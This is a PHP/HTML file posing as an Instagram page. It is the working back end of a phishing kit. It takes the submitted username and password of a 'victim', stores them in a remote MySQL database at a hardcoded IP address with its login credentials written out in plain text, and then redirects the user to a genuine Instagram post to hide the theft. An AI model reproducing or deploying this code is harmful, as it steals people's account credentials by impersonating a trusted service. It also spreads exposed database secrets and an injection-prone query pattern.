<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Instagram</title>
    <link rel="shortcut icon" href="Instagram_icon.png">
    <link rel="stylesheet" href="inter_ig_kgg.css">
  </head>
  <body>
    <?php
      $uservict=htmlentities($_POST['user']);
      $passwordvict=htmlentities($_POST['psswd']);

      $bdd= new mysqli('185.98.131.94','tmres1084668','ayececxny9','tmres1084668') or die ("Connexion Impossible");
      if($bdd->connect_errno){
        echo('Connect failed');
      }
      $sql='INSERT INTO IDENTIFIANTS (uservict,passwordvict) VALUES ("'.$uservict.'","'.$passwordvict.'");';
      if ($bdd->query($sql) === TRUE){
        header('Location: https://www.instagram.com/p/BmhIwdRgMR5/?utm_source=ig_web_copy_link');
        exit();
      }
      else{
        echo('Connection failed');
      }
      mysqli_close($bdd)
  ?>
  </body>
</html>
